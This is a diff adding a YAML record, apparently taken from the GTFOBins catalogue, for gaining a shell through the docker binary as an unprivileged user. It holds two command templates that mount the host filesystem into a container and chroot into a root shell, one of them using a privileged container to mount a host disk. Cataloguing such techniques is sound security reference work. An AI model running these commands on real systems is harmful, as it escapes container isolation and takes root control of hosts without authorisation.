@@ -1,0 +1,32 @@
+id: gtfobins/docker/shell/unprivileged
+type: binary
+platform: linux
+name: docker
+phases:
+- execution
+capabilities:
+- shell
+privilege_required: user
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh
+- template: 'docker run --rm -it --privileged -u root alpine
+
+    mount /dev/sda1 /mnt/
+
+    ls -la /mnt/
+
+    chroot /mnt /bin/bash'
+  comment: This exploits the fact that is run with the `--privileged` option to directly mount a host's
+    disk, e.g., `/dev/sda1`.
+references:
+- https://gtfobins.github.io/gtfobins/docker/
+tags:
+- linux
+- unix
+- gtfobins
